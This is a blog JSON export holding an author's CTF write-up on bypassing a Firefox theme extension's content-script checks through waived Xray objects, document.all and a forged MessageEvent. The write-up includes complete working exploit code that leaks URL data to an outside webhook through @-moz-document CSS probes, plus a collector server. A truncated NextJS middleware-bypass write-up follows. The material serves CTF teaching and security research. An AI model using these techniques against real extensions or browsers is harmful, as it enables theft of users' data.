[{"content":"","date":"1 November 2025","externalUrl":null,"permalink":"/","section":"","summary":"","title":"","type":"page"},{"content":"","date":"1 November 2025","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","date":"1 November 2025","externalUrl":null,"permalink":"/tags/client-side/","section":"Tags","summary":"","title":"Client-Side","type":"tags"},{"content":" TL;DR # Forcing a Firefox Xray Vision Waiving on an untrusted object passed via MessageEvent to a Content Script privileged execution context using document.all object weirdness, and bypassing Content Script validation checks by defining custom getters on the waived document.all and by emptying all DOM tree nodes. Once the malicious object is forwarded to the Extension background script, all browser.scripting.insertCSS API arguments can be set, and therefore injecting an User origin stylesheet with enabled @-moz-document rules to exfiltrate the flag from the challenge tab URL.\nDescription # Do you love ricing?\nChallenge Scenario # The challenge is supposed to be about a Custom Theme Generator extension for Firefox, since it\u0026rsquo;s a fairly common practice for \u0026ldquo;ricing\u0026rdquo; enthusiasts to just trust third-parties userChrome.css themes files, even though they can be quite powerful. But, it\u0026rsquo;s just CSS at the end of the day, right..?\nUpon visiting the challenge page, flying mhackeroni‚Ñ¢ spaceshuttles are flying all over the screen, and switching to the \u0026ldquo;Editor\u0026rdquo; tab, users can customize their Ctrl+Space‚Ñ¢ special edition them as their likings:\nextension landpage Your browser does not support the video tag. i had a bit too much fun with that :/ The page also invites users to download their customized theme and applying it manually, or by directly installing the provided extension zip file and loading it in their Firefox Add-ons.\nFlying mhackeroni‚Ñ¢ spaceshuttles are now navigating in your chatgpt.com window! Actually, all of them!\nctrl+space‚Ñ¢ google.com Your favorite clanker mhackeroni‚Ñ¢ themed We can now analyze the actual challenge sources after harassing our GPU :)\nThe challenge bot is fairly simple: runs a geckodriver instance under Selenium, allows only http/https urls, disables WASM and JIT, and finally does the following actions:\ndriver.install_addon(EXTENSION_PATH, temporary=True) driver.get(f\u0026#34;{BASE_URL}/?flag={FLAG}\u0026#34;) driver.switch_to.new_window(\u0026#34;tab\u0026#34;) driver.get(url) time.sleep(TIMEOUT) Which 1) installs the provided extension as a temporary add-on, 2) visits the challenge page with the flag in the URL, 3) opens a new tab with the user-provided URL, and 4) sleeps for TIMEOUT (10) seconds before quitting. The player is therefore required to exfiltrate the flag from the challenge page URL, but this can\u0026rsquo;t be done with CSSI alone, right..?\nThe extension setup is also quite simple and common: A manifest.json that gives scripting permission to an extension which is running a background.js on install and that injects a contentscript.js Content Script on all pages to act as a \u0026ldquo;bridge\u0026rdquo; between the extension \u0026ldquo;priviledged\u0026rdquo; execution context and the \u0026ldquo;untrusted\u0026rdquo; page context and DOM.\nmanifest.json\n{ \u0026#34;manifest_version\u0026#34;: 3, \u0026#34;name\u0026#34;: \u0026#34;Ctrl+Space CTF special edition firefox theme\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;1.0.0\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;‚ú®\u0026#34;, \u0026#34;permissions\u0026#34;: [ \u0026#34;scripting\u0026#34; ], \u0026#34;host_permissions\u0026#34;: [ \u0026#34;*://*/*\u0026#34; ], \u0026#34;background\u0026#34;: { \u0026#34;scripts\u0026#34;: [\u0026#34;background.js\u0026#34;] }, \u0026#34;externally_connectable\u0026#34;: { \u0026#34;matches\u0026#34;: [\u0026#34;http://127.0.0.1:80\u0026#34;, \u0026#34;http://localhost:80\u0026#34;] }, \u0026#34;browser_specific_settings\u0026#34;: { \u0026#34;gecko\u0026#34;: { \u0026#34;id\u0026#34;: \u0026#34;someonethatcantdospacepwnbutwritesffthemes@mhackeroni.it\u0026#34; } } } Note that the extension\u0026rsquo;s manifest defined host_permissions for all URLs, which allows it to inject scripts and stylesheets into any webpage the user visits. Once installed, you\u0026rsquo;ll also notice that the manifest declares externally_connectable URLs, because you\u0026rsquo;ll get the following warning:\nReading manifest: Warning processing externally_connectable: An unexpected property was found in the WebExtension manifest.\nFrom MDN Web Docs:\nExternally connectable controls which other extensions and web pages can communicate with an extension using runtime.connect() and runtime.sendMessage() message passing.\nHowever, as MDN also points out, the functionality it\u0026rsquo;s not yet supported on firefox, meaning it\u0026rsquo;s useless. This was supposed to just be a cheap anti-slop/anti-llm-clankers hallucination bait üé£ (pt.1.).\nbackground.js\n// background.js async function setup() { await browser.scripting.registerContentScripts([{ id: \u0026#34;bridge\u0026#34;, js: [\u0026#34;contentscript.js\u0026#34;], matches: [\u0026#34;*://*/*\u0026#34;], world: \u0026#34;ISOLATED\u0026#34; }]); } async function applyTheme(msg, sender) { const extInfo = await browser.management.getSelf(); const ENV = extInfo.installType; if (ENV !== \u0026#34;development\u0026#34;) return; if (sender.id !== browser.runtime.id) return; const defaultOpts = { origin: \u0026#34;AUTHOR\u0026#34;, target: { tabId: sender.tab.id } }; const opts = Object.assign(defaultOpts, msg); await browser.scripting.insertCSS(opts); } browser.runtime.onMessage.addListener(applyTheme); browser.runtime.onInstalled.addListener(setup); The extension\u0026rsquo;s background script registers the content script on install from the extension files, and listens for messages from it to apply the theme CSS to the current tab. However, it only applies the theme if the extension is in development mode and the message sender is the extension itself. A few remarks can be made here:\n\u0026ldquo;Development mode\u0026rdquo; just means whether the extension was loaded as a temporary add-on from disk or installed from the store. It\u0026rsquo;s not a controllable flag. The client side bot will install it with the temporary=True flag, meaning the bot will always have that \u0026ldquo;development mode\u0026rdquo; enabled. This was supposed to just be a cheap anti-slop/anti-llm-clankers hallucination bait üé£ (pt.2.). The sender check is redundant, since runtime.onMessage only receives messages from the extension\u0026rsquo;s own context, i.e. only from the installed content script. This was supposed to just be a cheap anti-slop/anti-llm-clankers hallucination bait üé£ (pt.3.). The defaultOpts object sets a few default arguments for the insertCSS call, but the object is then merged with the msg object with Object.assign() function, which uses right-to-left precedence, meaning they can be overridden if specified in the msg object. (Not a clanker bait this time). But can we actually specify otherwise in the content script? Let\u0026rsquo;s see.\ncontentscript.js\n// contentscript.js function validateCssRules(cssRules) { for (const rule of cssRules) { if (![CSSStyleRule, CSSFontFaceRule, CSSKeyframesRule].some(type =\u0026gt; rule instanceof type)) { throw new Error(\u0026#34;[SPTE] Only CSS style-rules allowed\u0026#34;); } validateCssRules(rule?.cssRules ?? []); } } function validateInsertOptions(opts) { if (opts.css \u0026amp;\u0026amp; opts.files) { throw new Error(\u0026#34;[SPTE] Cannot specify both CSS and files options\u0026#34;); } if (opts.css \u0026amp;\u0026amp; typeof opts.css === \u0026#34;string\u0026#34;) { const stylesheet = new CSSStyleSheet(); stylesheet.replaceSync(opts.css); validateCssRules(stylesheet.cssRules); } else if (opts.files \u0026amp;\u0026amp; Array.isArray(opts.files)) { for (const fileUrl of opts.files) { if (new URL(fileUrl).origin !== new URL(browser.runtime.getURL(\u0026#34;\u0026#34;)).origin) { throw new Error(\u0026#34;[SPTE] Invalid file origin\u0026#34;); } } } else { throw new Error(\u0026#34;[SPTE] Either CSS or files options must be specified\u0026#34;); } if (opts.origin \u0026amp;\u0026amp; opts.origin !== \u0026#34;AUTHOR\u0026#34;) { throw new Error(\u0026#34;[SPTE] Invalid origin specified\u0026#34;); } } async function applyDefaultTheme() { let fetchedCss = await (await fetch(\u0026#34;http://127.0.0.1:80/img/theme.css\u0026#34;)).text(); browser.runtime.sendMessage(browser.runtime.id, { css: fetchedCss }, {}); }; window.addEventListener(\u0026#34;message\u0026#34;, evt =\u0026gt; { if (evt.origin !== window.origin) return; const options = evt.data || evt.data.wrappedJSObject; validateInsertOptions(options); const details = { ...options }; browser.runtime.sendMessage(browser.runtime.id, details, {}); }); applyDefaultTheme(); The Content Script running in pages listens for incoming message events, validates that the event origin matches the current page origin, and then validates the options object received with validateInsertOptions function before forwarding it to the background script.\nFirst of all, the if (evt.origin !== window.origin) return; check is, again, useless, since the content script is running in the page context, evt.origin will always match window.origin. Moreover, while this is kinda of ok in normal webpages for cross-site protection, it\u0026rsquo;s not in case of extensions. Any origin could just dispatch a raw MessageEvent to the page, and it would trigger the content script event listener anyway, effectively bypassing any origin checks since MessageEvent\u0026rsquo;s constructor has an origin parameter that can be set to any value. the Event\u0026rsquo;s isTrusted property should always be checked in those cases, since dispatched raw MessageEvent instances will always have isTrusted set to false.\nThe validateInsertOptions function instead runs a few type checks and nullish/undefined checks on the passed properties, and particularly validates that:\nEither css or files property is specified. If css property is specified, it must be a string containing only CSS style rules (no @import, @media, @supports, @namespace, etc.) (I\u0026rsquo;ve just whitelisted the rules needed by the default CSS theme). If files property is specified, all files must be from the extension\u0026rsquo;s own origin. If origin property is specified, it must be set to \u0026quot;AUTHOR\u0026quot;. As these checks stand out, it\u0026rsquo;s not possible to achieve any meaningful injection (except for Firefox 0days :p).\nBut Why?\nStylesheets Origins # The key is mainly on the insertCSS API origin parameter restriction to \u0026quot;AUTHOR\u0026quot; only. This parameter specifies the stylesheet origin it\u0026rsquo;s being applied.\nFrom MDN Web Docs:\nAuthor stylesheets are the most common type of stylesheet; these are the styles written by web developers. [\u0026hellip;] The author, or web developer, defines the styles for the document using one or more linked or imported stylesheets, \u0026lt;style\u0026gt; blocks, and inline styles defined with the style attribute. These author styles define the look and feel of the website ‚Äî its theme.\nBasically common known CSS styles applied by web pages. So what are \u0026ldquo;User stylesheets\u0026rdquo; about then?\nIn most browsers, the user (or reader) of the website can choose to override styles using a custom user stylesheet designed to tailor the experience to the user\u0026rsquo;s wishes. Depending on the user agent, user styles can be configured directly or added via browser extensions.\nThose have something to do with extensions! And these are exactly what type of stylesheets you\u0026rsquo;re using when using custom userChrome.css themes on your riced Firefox setup!\nBut how they differ in practice? User stylesheets have the higher precedence in the CSS Cascade, meaning they will always override Author stylesheets, even if the Author styles use !important rules. But apart from that, they also have sometimes access to internal or legacy features that only UA stylesheets have!\n@-moz-document at-rule abuse # For example, back in the days, Firefox allowed extensions to use -moz-binding CSS property, which allowed to bind XUL elements (Firefox\u0026rsquo;s own UI elements!) to arbitrary XML files containing XBL components (definitely not safe at all). Those bindings had a weak \u0026ldquo;signed JAR\u0026rdquo; policy that could be bypassed and achieve UXSS! https://www.mozilla.org/en-US/security/advisories/mfsa2008-57/.\nThis is fun but 2008 is long gone, right? (Even tho they restricted it to UA stylesheets only in 2019!)\nYes, but more legacy features are still available. One of them is the -moz-document CSS at-rule. This at-rule allows to apply CSS rules based on document\u0026rsquo;s URL matching.\nOuch :/ Who ever thought that would be a good idea?\nThe feature as MDN documents, it\u0026rsquo;s obviously non-standard, and was deprecated in Firefox after Firefox bug 1035091 that exposed clear security issues with it. However, the rule is still supported in Firefox user stylesheets!\n-moz-document deprecation mdn And since we can define \u0026ldquo;USER\u0026rdquo; origin stylesheets within insertCSS API, we could use it to exfiltrate the flag from the challenge page URL.\nHonestly I think it\u0026rsquo;s kinda ok to have as a feature in user stylesheets, but it\u0026rsquo;s surely should be limited to domain matching only, but as today we can clearly match full URLs with it\u0026hellip;and with regexes also! No CSP is applied to the challenge page, meaning the following rule will be enough to tell us whether the flag has a 0 character in the 2nd place:\n@-moz-document regexp(\u0026#34;http:\\/\\/127\\.0\\.0\\.1:80\\/\\?flag=space..0\u0026#34;) { :root { --background-image: url(\u0026#34;http://webhook/?flag=space{.0\u0026#34;); } } Waiving Firefox Xray Vision and abusing document.all weirdness # Well, but we can\u0026rsquo;t set origin: \u0026quot;USER\u0026quot; parameter because of the content script check, right?\nWe actually can! and it all relies in this little detail in the content script:\nconst options = evt.data || evt.data.wrappedJSObject; The evt.data.wrappedJSObject property is a non-standard Firefox-specific object‚Äôs property present in higher priviledge execution contexts, that allows to access the underlying \u0026ldquo;wrapped\u0026rdquo; JavaScript object from XPCOM components, i.e. the underlying low-level C++ implementation of Javascript objects in the Gecko engine.\nIn Firefox, Javascript running in privileged security context, like extensions files, is called \u0026ldquo;chrome code\u0026rdquo; and assumed to be trusted (\u0026ldquo;If chrome-privileged code is compromised, the attacker can take over the user‚Äôs computer.\u0026rdquo;). Meanwhile JavaScript loaded from normal web pages is called \u0026ldquo;content code\u0026rdquo;.\nBut, content code can sometimes reach the chrome code execution context (e.g. think of an object passed inside a postMessage!) and that violates security boundaries:\nThe security machinery in Gecko ensures that there‚Äôs asymmetric access between code at different privilege levels: so for example, content code can‚Äôt access objects created by chrome code, but chrome code can access objects created by content. However, even the ability to access content objects can be a security risk for chrome code. JavaScript‚Äôs a highly malleable language. Scripts running in web pages can add extra properties to DOM objects (also known as expando properties) and even redefine standard DOM objects to do something unexpected. If chrome code relies on such modified objects, it can be tricked into doing things it shouldn‚Äôt.\nTherefore, before reaching that execution context, Firefox applies a security layer called Xray Vision that \u0026ldquo;wraps\u0026rdquo; user passed objects and allows the priviledged execution context to literally \u0026ldquo;see through\u0026rdquo; the object on any property access and directly use the underlying low-level C++ native implementation, meaning any user-defined expando properties or user redefinitions will be ignored because they exists on the higher-level JavaScript representation only.\nSometimes however, you actually want to access the full user-defined object, and to do so you need to \u0026ldquo;Waive the object\u0026rdquo; (i.e. \u0026ldquo;unwrapping\u0026rdquo; the object), and a common way to do so is to use the wrappedJSObject property. As such this action is considered unsafe, as per MDN Web Docs:\nWaivers are transitive: so if you waive Xray vision for an object, then you automatically waive it for all the object‚Äôs properties. For example, window.wrappedJSObject.document gets you the waived version of document. To undo the waiver again, call Components.utils.unwaiveXrays(waivedObject).\nFocus on the Waivers are transitive: that\u0026rsquo;s exactly what happens in our case! After obtaining the evt.data.wrappedJSObject object, all the options.css, options.files, options.origin properties, the object prototype chain, the object instance methods, etc. will be the user defined ones.\nWhat does that implicates?\nWe can simply define our custom getters methods on the evt.data object to evade in a TOCTOU style the content script validation checks! More concretely:\nvar nCalls = { \u0026#34;css\u0026#34;: 0 }; Object.defineProperty(obj, \u0026#39;css\u0026#39;, { configurable: true, enumerable: true, get() { nCalls.css++; return nCalls.css % 2 === 0 ? evilCss : safeCss; } }); We are defining using Object.defineProperty on an arbitrary user-controlled object obj, a custom getter for the css such that it will return the safeCss string value on the first call (i.e. during validation), and the evilCss string value on the second call (i.e. when the background script will read the property to forward it to insertCSS API).\nWe can apply the same idea to all other properties and effectively make the content script checks useless.\nWe still have one last problem though: options will be defined as evt.data.wrappedJSObject only if evt.data is falsy. How do we even pass a \u0026ldquo;falsy object\u0026rdquo; that can still be called as such? Aren\u0026rsquo;t all objects truthy by definition in JavaScript? E.g:\nif ({}) console.log(\u0026#34;runs\u0026#34;); // \u0026#34;runs\u0026#34; if ([]) console.log(\u0026#34;also runs\u0026#34;); // \u0026#34;also runs\u0026#34; The only exceptions are for false, 0, null, undefined, and NaN. However, those are called primitive values and as such they do not have their own properties or methods.\nHow do you even do that??\nLet me introduce yet another legacy, deprecated feature: document.all (it\u0026rsquo;s still supported on all major browsers this time though!).\nThis object is a legacy way to literally access all elements in the document DOM tree, in their order. It\u0026rsquo;s an alternative to Document.querySelectorAll and returns an HTMLAllCollection object.\nHowever, this object is just straight up weird.\nE.g. what do you think typeof document.all returns? Clearly undefined, right? What about document.all instanceof Object then? Surely true, right? What about if (!document.all) { console.log(\u0026quot;wtf!?\u0026quot;) } ?? All objects are truthy by definition, right???? Well try it out yourself:\nconsole.log(typeof document.all); // \u0026#34;undefined\u0026#34; console.log(document.all instanceof Object); // true if (document.all) { console.log(\u0026#34;all JS objects are truthy by definition\u0026#34;); } else { console.log(\u0026#34;wtf!?\u0026#34;); } // \u0026#34;wtf!??\u0026#34; console.log(document.all ? \u0026#34;truthy\u0026#34; : \u0026#34;falsy\u0026#34;); // \u0026#34;falsy\u0026#34; console.log(document.all == false); // false // it\u0026#39;s even callable! document.all(\u0026#34;shouldnotbecallableright\u0026#34;) // \u0026lt;div id=\u0026#34;shouldnotbecallableright\u0026#34;\u0026gt; Those weird behaviors are due to legacy reasons and web compatibility and are documented in MDN here.\nIn summary, we can use document.all to get a falsy expression on the const options = evt.data || evt.data.wrappedJSObject; line, to get a user controllable Waived Xray Vision object, and then we can define our custom getters on it to bypass the content script checks.\nOne last obstacle remains: document.all in fact returns all elements of the page, meaning that even if we redefine custom getters we\u0026rsquo;ll still have excess properties (i.e. the page html elements) inside the details object.\nAlso, given that details is defined as const details = { ...options };, we\u0026rsquo;ll have HTMLElement instances in it and since all postMessages (and therefore browser.runtime.sendMessage) calls use the Structured clone algorithm on the passed object, it will throw a DataCloneError: The object could not be cloned. exception.\nWhat about having no html elements at all on the page then? Well, even if we define an empty page, the browser will still at least put the root element \u0026lt;html\u0026gt; in the DOM tree, meaning document.all will still contain at least that. Let alone the \u0026lt;script\u0026gt; tag itself hosting our exploit code.\nWhat about removing *ALL* html elements from the DOM then? Like, all of them? Even the script tag itself, even the root \u0026lt;html\u0026gt; tag!?\nYes it\u0026rsquo;s possible! (lol)\nwhile (document.firstChild) { document.removeChild(document.firstChild); } console.log(document.all.length); // 0 Finally, turns out that in all modern browsers we can manipulate the document.all object and the DOM tree such that document.all becomes an arbitrary falsy, empty, HTMLAllCollection object that can have arbitrary properties set by javascript or arbitrary named properties set using common DOM clobbering techniques. And it\u0026rsquo;s even callable!\nCSS Exfiltration # At this point, the challenge is pretty much solved. Based on that we can achieve CSS injection on the challenge page by passing the crafted document.all object with our custom getters to the content script, with a css property containing our @-moz-document rules to match the flag, and by also passing a origin: \u0026quot;USER\u0026quot; property such that @-moz-document rules are actually enabled and a target: { tabId: ... } property to specify the tab to apply the CSS to (the flag tab will always have tabId = 1 in the bot).\nSince I was lenient and put the whole flag in the URL instead of a runtime generated token, you could have even manually exfiltrated the flag by matching each character with multiple reports, but it could have been a bit painful since the the flag is 64 chars long.\nMy final exploit, instead, implements a one-shot solver playing around the CSS selectors Specificity algorithm: since we will have multiple different @-moz-document rules, each one of them trying to match a different probe, e.g. http://127.0.0.1/?flag?space{a, http://127.0.0.1/?flag?space{b, http://127.0.0.1/?flag?space{aa, etc.\nThe problem in having this many same rules, each one of them specifying a slightly different selector and trying to set the background-image attribute, will incour into a Specificity conflict and only the most specific rules \u0026ldquo;wins\u0026rdquo; the assigment. Only 1 exfiltration request will be triggered.\nI bypassed this restriction with the following payload generation:\nlet knownFlag = \u0026#34;space{\u0026#34;; function buildEvilCss(nChars) { const totalProbes = nChars * ALPHABET.length; const collector = `:root { background-image: ${Array.from({ length: totalProbes }, (_, i) =\u0026gt; `var(--p${i}, none)`).join(\u0026#34;, \u0026#34;)} !important; }`; const blocks = [collector]; let probeN = 0; for (let pos = 0; pos \u0026lt; nChars; pos++) { for (const char of ALPHABET) { const probePattern = escapeForRegex(BASE_URL + knownFlag + \u0026#34;.\u0026#34;.repeat(pos) + char + \u0026#34;.*\u0026#34;); blocks.push( `@-moz-document regexp(\u0026#34;${probePattern}\u0026#34;) {`, ` :root {`, ` --p${probeN}: url(\u0026#34;${WEBHOOK}/leaked/${probePattern}\u0026#34;);`, ` }`, `}` ); probeN++; } } return blocks.join(\u0026#34;\\n\u0026#34;); } Key detail: each matching rule sets a different custom property: --p0, --p1, --p2, --pN vars. Therefore, no conflicts will arise and all matching rules will be applied, each one triggering a different exfiltration request to my webhook server with the matched probe in the URL.\nThe fact that each defined --pN var is resolved after their assignments is, again, because of the CSS Cascade algorithm order.\nSolution # Wrapping everything up, the final exploit code is the following:\n// exploit.js const WEBHOOK = \u0026#34;https://brle6wul.requestrepo.com\u0026#34;; const BASE_URL = \u0026#34;http://127.0.0.1/?flag=\u0026#34;; const ALPHABET = \u0026#34;abcdefghijklmnopqrstuvwxyz0123456789_{}?\u0026#34;; const sleep = (ms) =\u0026gt; new Promise(resolve =\u0026gt; setTimeout(resolve, ms)); const escapeForRegex = (s) =\u0026gt; s.replace(/[/.?{}]/g, \u0026#34;.\u0026#34;); let knownFlag = \u0026#34;space{\u0026#34;; function buildEvilCss(nChars) { const totalProbes = nChars * ALPHABET.length; const collector = `:root { background-image: ${Array.from({ length: totalProbes }, (_, i) =\u0026gt; `var(--p${i}, none)`).join(\u0026#34;, \u0026#34;)} !important; }`; const blocks = [collector]; let probeN = 0; for (let pos = 0; pos \u0026lt; nChars; pos++) { for (const char of ALPHABET) { const probePattern = escapeForRegex(BASE_URL + knownFlag + \u0026#34;.\u0026#34;.repeat(pos) + char + \u0026#34;.*\u0026#34;); blocks.push( `@-moz-document regexp(\u0026#34;${probePattern}\u0026#34;) {`, ` :root {`, ` --p${probeN}: url(\u0026#34;${WEBHOOK}/leaked/${probePattern}\u0026#34;);`, ` }`, `}` ); probeN++; } } return blocks.join(\u0026#34;\\n\u0026#34;); } function cleanDocumentAllObject() { while (document.firstChild) { document.removeChild(document.firstChild); } } cleanDocumentAllObject(); const evilCss = buildEvilCss(64); const safeCss = `* {color: red !important; }`; var nCalls = { \u0026#34;css\u0026#34;: 0, \u0026#34;origin\u0026#34;: 0 }; Object.defineProperty(document.all, \u0026#39;css\u0026#39;, { configurable: true, enumerable: true, get() { nCalls.css++; return nCalls.css % 2 === 0 ? safeCss : evilCss; } }); Object.defineProperty(document.all, \u0026#39;origin\u0026#39;, { configurable: true, enumerable: true, get: function () { nCalls.origin++; return nCalls.origin % 2 === 0 ? \u0026#34;AUTHOR\u0026#34; : \u0026#34;USER\u0026#34;; } }); Object.defineProperty(document.all, \u0026#39;target\u0026#39;, { configurable: true, enumerable: true, get: function () { return { tabId: 1 }; } }); (async () =\u0026gt; { await sleep(1_000); var fakeMessageEvent = new MessageEvent( \u0026#34;message\u0026#34;, { origin: window.origin, data: document.all } ); window.dispatchEvent(fakeMessageEvent); console.log(\u0026#34;[PAGE] dispatched fake message event\u0026#34;); })(); and this was the server used to automatically startup a ngrok tunnel and reassemble all the collected probes:\n#!/usr/bin/env python3 import os, re, sys, time, json, logging, threading, requests, urllib.parse from flask import Flask, Response from pyngrok import ngrok TARGET = sys.argv[1] if len(sys.argv) \u0026gt; 1 else \u0026#34;http://127.0.0.1\u0026#34; PORT = 8001 TIMEOUT = 20 QUIET_WINDOW = 10 FLAG_PREFIX = \u0026#34;space{\u0026#34; EXPLOIT_TEMPLATE = open(\u0026#34;exploit/exploit.js\u0026#34;).read() def escape_for_regex(text: str) -\u0026gt; str: return re.sub(r\u0026#34;[/.?{}]\u0026#34;, \u0026#34;.\u0026#34;, text) def make_exploit(public_url: str, base_url: str) -\u0026gt; str: body = re.sub(r\u0026#39;const\\s+WEBHOOK\\s*=\\s*\u0026#34;.*?\u0026#34;;\u0026#39;, f\u0026#39;const WEBHOOK = \u0026#34;{public_url}\u0026#34;;\u0026#39;, EXPLOIT_TEMPLATE, count=1) return body def parse_probe(probe: str): flag_index = probe.find(\u0026#34;flag=\u0026#34;) if flag_index == -1: return None fragment = probe[flag_index + 5 :] star_index = fragment.find(\u0026#34;.*\u0026#34;) if star_index == -1: return None value = fragment[:star_index] if not value.startswith(prefix_escaped): return None tail = value[len(prefix_escaped) :] if not tail: return None pos = len(tail) - 1 token = tail[-1] char = token if token != \u0026#34;.\u0026#34; else \u0026#34;?\u0026#34; return pos, char app = Flask(__name__) mutex = threading.Lock() flag_chars = [] html_body = \u0026#34;\u0026#34; exploit_body = \u0026#34;\u0026#34; prefix_escaped = escape_for_regex(FLAG_PREFIX) last_update = 0.0 @app.route(\u0026#34;/\u0026#34;) def index() -\u0026gt; Response: return Response(html_body, mimetype=\u0026#34;text/html\u0026#34;) @app.route(\u0026#34;/exploit.js\u0026#34;) def exploit() -\u0026gt; Response: return Response(exploit_body, mimetype=\u0026#34;application/javascript\u0026#34;) @app.route(\u0026#34;/leaked/\u0026lt;path:pattern\u0026gt;\u0026#34;) def leaked(pattern: str) -\u0026gt; Response: decoded = urllib.parse.unquote(pattern) position_char = parse_probe(decoded) if position_char is not None: pos, ch = position_char with mutex: while len(flag_chars) \u0026lt;= pos: flag_chars.append(\u0026#34;?\u0026#34;) current = flag_chars[pos] if current == ch: return Response(status=204) if current != \u0026#34;?\u0026#34; and ch == \u0026#34;?\u0026#34;: return Response(status=204) flag_chars[pos] = ch global last_update last_update = time.time() logging.info(\u0026#34;Recovered #%d --\u0026gt; %s | %s\u0026#34;, pos + len(FLAG_PREFIX), ch, FLAG_PREFIX + \u0026#34;\u0026#34;.join(flag_chars)) return Response(status=204) def start_server() -\u0026gt; threading.Thread: thread = threading.Thread( target=lambda: app.run(host=\u0026#34;0.0.0.0\u0026#34;, port=PORT, use_reloader=False, threaded=True), daemon=True, ) thread.start() return thread def main() -\u0026gt; int: logging.basicConfig( level=logging.INFO, format=\u0026#34;%(asctime)s | %(levelname)s | %(message)s\u0026#34;, datefmt=\u0026#34;%H:%M:%S\u0026#34;, ) global html_body, exploit_body, flag_chars, last_update base_url = f\u0026#34;{TARGET.rstrip(\u0026#39;/\u0026#39;)}/?flag=\u0026#34; flag_chars.clear() last_update = time.time() html_template = \u0026#34;\u0026#34;\u0026#34;\u0026lt;!doctype html\u0026gt;\u0026lt;body\u0026gt;\u0026lt;script src=\u0026#34;{PUBLIC}/exploit.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;\u0026#34;\u0026#34;\u0026#34; logging.info(\u0026#34;Starting local Flask server on port %d\u0026#34;, PORT) start_server() token = os.environ.get(\u0026#34;NGROK_AUTHTOKEN\u0026#34;) if token: ngrok.set_auth_token(token) tunnel = None try: tunnel = ngrok.connect(f\u0026#34;http://127.0.0.1:{PORT}\u0026#34;) public_url = tunnel.public_url.rstrip(\u0026#34;/\u0026#34;) logging.info(\u0026#34;ngrok tunnel: %s\u0026#34;, public_url) html_body = html_template.replace(\u0026#34;{PUBLIC}\u0026#34;, public_url) exploit_body = make_exploit(public_url, base_url) payload = {\u0026#34;url\u0026#34;: f\u0026#34;{public_url}/\u0026#34;} logging.info(\u0026#34;Triggering bot visit to %s\u0026#34;, payload[\u0026#34;url\u0026#34;]) res = requests.post( f\u0026#34;{TARGET.rstrip(\u0026#39;/\u0026#39;)}/bot/visit\u0026#34;, headers={\u0026#34;content-type\u0026#34;: \u0026#34;application/json\u0026#34;}, data=json.dumps(payload), timeout=10, ) res.raise_for_status() logging.info(\u0026#34;Bot accepted the visit. Waiting for leaks...\u0026#34;) deadline = time.time() + TIMEOUT while time.time() \u0026lt; deadline: with mutex: no_updates = (time.time() - last_update \u0026gt; QUIET_WINDOW) and bool(flag_chars) if no_updates: break time.sleep(0.5) with mutex: if not flag_chars: logging.error(\u0026#34;Timeout. No leaks captured.\u0026#34;) return 1 if flag_chars[-1] != \u0026#34;}\u0026#34;: flag_chars[-1] = \u0026#34;}\u0026#34; final_flag = FLAG_PREFIX + \u0026#34;\u0026#34;.join(flag_chars) logging.info(\u0026#34;\\n\\nFlag recovered: %s\u0026#34;, final_flag) print(final_flag) return 0 except requests.RequestException as exc: logging.error(\u0026#34;Bot visit failed: %s\u0026#34;, exc) return 1 finally: if tunnel is not None: try: ngrok.disconnect(tunnel.public_url) except Exception: pass if __name__ == \u0026#34;__main__\u0026#34;: raise SystemExit(main()) Flag # space{s0_much_leg4cy_0ut_there_4nyw4y_h0w_d0_y0u_c4ll_th4t??_ucssi??}\n","date":"1 November 2025","externalUrl":null,"permalink":"/posts/ctrl+space-ctf-finals-2025/ricingstar/","section":"Blog","summary":"Writeup for the Ctrl+Space CTF Finals 2025 web client-side Firefox challenge \u0026ldquo;RicingStar\u0026rdquo;.","title":"Ctrl+Space CTF Finals 2025 - RicingStar [Author Writeup]","type":"posts"},{"content":"","date":"1 November 2025","externalUrl":null,"permalink":"/tags/extensions/","section":"Tags","summary":"","title":"Extensions","type":"tags"},{"content":"","date":"1 November 2025","externalUrl":null,"permalink":"/tags/firefox/","section":"Tags","summary":"","title":"Firefox","type":"tags"},{"content":"","date":"1 November 2025","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"1 November 2025","externalUrl":null,"permalink":"/categories/web/","section":"Categories","summary":"","title":"Web","type":"categories"},{"content":" TL;DR # The proxy/app.py server is a simple reverse proxy that start up a NextJS app instance and forwards requests to it. This proxy is vulnerable because it allows setting an environment variable, but with length constraints and without controlling the value. This can be abused to set the NEXT_PRIVATE_TEST_HEADERS env var on the NextJS app and make the CVE-2025-29927 exploit possible again.\nDescription # I heard about some next.js cve issues recently, so I decided to provide next.js on a safe version for anyone!\nIntroduction # Another week goes by, and again NextJS can\u0026rsquo;t go 5 seconds without humiliating itself. Since the public disclosure of CVE-2025-29927, NextJS has caught the attention of many security researchers from all over the world, and in particular from CTF players. When I saw that this weekend too there was a challenge on NextJS I could NOT skip it, I needed a good laugh.\nAt this point I don\u0026rsquo;t know anymore who\u0026rsquo;s the most bullied between NextJS and Bun. It was one of the first challenges I looked into, and after a few hours we got first blood :)\nAt the end of the event, it was the least solved web challenge along with web/musicplayer (which we also solved :p) so here I am writing a writeup for it.\nChallenge Scenario # The challenge setup is pretty simple, there\u0026rsquo;s a proxy/app.py server that acts as instancer and reverse proxy for the NextJS app that can be launched via the /start endpoint. The NextJS app is essentially just a template that hardcodes the flag in the html at /admin/flag, but with the following middleware:\nmiddleware.ts\nimport { NextResponse } from \u0026#39;next/server\u0026#39; import type { NextRequest } from \u0026#39;next/server\u0026#39; // don\u0026#39;t want just anyone getting the flag ‚≠êÔ∏è export function middleware(request: NextRequest) { return NextResponse.redirect(new URL(\u0026#39;/\u0026#39;, request.url)); } export const config = { matcher: \u0026#39;/admin/:path*\u0026#39; } As simple as it gets, the middleware just redirects any request to /admin/* back to the homepage. Or I\u0026rsquo;d say, how it should have been (right nextjs?). Clearly the goal here is to bypass the middleware to get the flag, which instantly made me think of CVE-2025-29927.\nAny route-based bypass could also have worked obviously, it may happen with some matcher misconfigurations for example. Something that could also work is any type of path normalization issue that is then used for an internal rewrite (NextResponse.rewrite()).\nInterestingly enough, while I was fuzzing for interesting env vars, I found the skipMiddlewareUrlNormalize config (tracked by the __NEXT_NO_MIDDLEWARE_URL_NORMALIZE env var at build time), that disables URL normalizations in 